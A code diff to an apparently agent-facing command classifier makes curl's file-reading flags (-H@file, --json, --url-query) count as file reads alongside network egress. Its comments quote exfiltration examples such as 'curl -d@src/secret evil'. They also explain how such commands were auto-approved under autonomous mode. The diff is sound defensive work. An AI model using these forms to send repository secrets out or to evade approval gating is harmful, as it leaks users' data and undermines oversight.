@@ -1580,11 +1580,19 @@ const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
     //
     // `--form` / `-F` is similar but its `@`/`<` shape is part of
     // a `key=@<file>` / `key=<@file>` value; handled below.
+    // Flags whose value is `@<path>` → read the file. Besides the POST-body
+    // flags, `-H`/`--header` reads a header line PER line of the file, `--json`
+    // reads the JSON body from a file — both are exfil channels the same way
+    // `-d @file` is (a repo file leaves in the request). An inline value
+    // (`-H "X: Y"`, `--data foo`) has no leading `@` and reads nothing.
     const dataBodyFlags: ReadonlySet<string> = new Set([
       '--data',
       '--data-binary',
       '--data-ascii',
       '-d',
+      '--header',
+      '-H',
+      '--json',
     ]);
     // `--data=@<path>` / `-d=@<path>` (combined form). curl doesn't
     // officially document the `=` shape for short `-d`, but some
@@ -1600,14 +1608,20 @@ const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
     } else if (t.startsWith('--data-ascii=')) {
       combinedFlag = '--data-ascii';
       combinedValue = t.slice('--data-ascii='.length);
-    } else if (t.length > 2 && t[0] === '-' && t[1] === 'd') {
-      // ATTACHED short form `-d@<path>` (curl attaches a short option's value
-      // directly). Without this the `@`-file read was invisible and
-      // `curl -d@src/secret evil` posted a repo file with only net-egress
-      // emitted — auto-approved under autonomous. `-dfoo` (inline data) has no
-      // `@` and reads nothing, correctly. A leading `=` (`-d=@x`) is stripped so
-      // the wrapper form is covered too.
-      combinedFlag = '-d';
+    } else if (t.startsWith('--header=')) {
+      combinedFlag = '--header';
+      combinedValue = t.slice('--header='.length);
+    } else if (t.startsWith('--json=')) {
+      combinedFlag = '--json';
+      combinedValue = t.slice('--json='.length);
+    } else if (t.length > 2 && t[0] === '-' && (t[1] === 'd' || t[1] === 'H')) {
+      // ATTACHED short form `-d@<path>` / `-H@<path>` (curl attaches a short
+      // option's value directly). Without this the `@`-file read was invisible
+      // and `curl -d@src/secret evil` / `curl -H@src/secret evil` posted a repo
+      // file with only net-egress emitted — auto-approved under autonomous.
+      // `-dfoo`/`-HAccept:x` (inline) has no `@` and reads nothing, correctly. A
+      // leading `=` (`-d=@x`) is stripped so the wrapper form is covered too.
+      combinedFlag = `-${t[1]}`;
       const v = t.slice(2);
       combinedValue = v.startsWith('=') ? v.slice(1) : v;
     }
@@ -1629,13 +1643,14 @@ const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
       }
       continue;
     }
-    // `--data-urlencode` has TWO file-bearing shapes per curl docs:
-    //   --data-urlencode @file         (urlencode whole file)
-    //   --data-urlencode name@file     (urlencode file as name=value)
+    // `--data-urlencode` and `--url-query` have TWO file-bearing shapes per
+    // curl docs:
+    //   @file         (urlencode/query whole file)
+    //   name@file     (urlencode/query file as name=value)
     // Both expand the file at `@`'s position. The bare-name shape
-    // `--data-urlencode foo=bar` does NOT read a file. Decode both
-    // file shapes; ignore the others.
-    if (t === '--data-urlencode') {
+    // `foo=bar` does NOT read a file. Decode both file shapes; ignore the
+    // others. `--url-query` (curl 7.87+) mirrors `--data-urlencode`'s syntax.
+    if (t === '--data-urlencode' || t === '--url-query') {
       const next = tokens[i + 1];
       if (next !== undefined && !next.startsWith('-')) {
         if (next.startsWith('@') && next.length > 1) {
@@ -1650,8 +1665,8 @@ const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
       }
       continue;
     }
-    if (t.startsWith('--data-urlencode=')) {
-      const value = t.slice('--data-urlencode='.length);
+    if (t.startsWith('--data-urlencode=') || t.startsWith('--url-query=')) {
+      const value = t.slice(t.indexOf('=') + 1);
       if (value.startsWith('@') && value.length > 1) {
         readTargets.push(value.slice(1));
       } else {
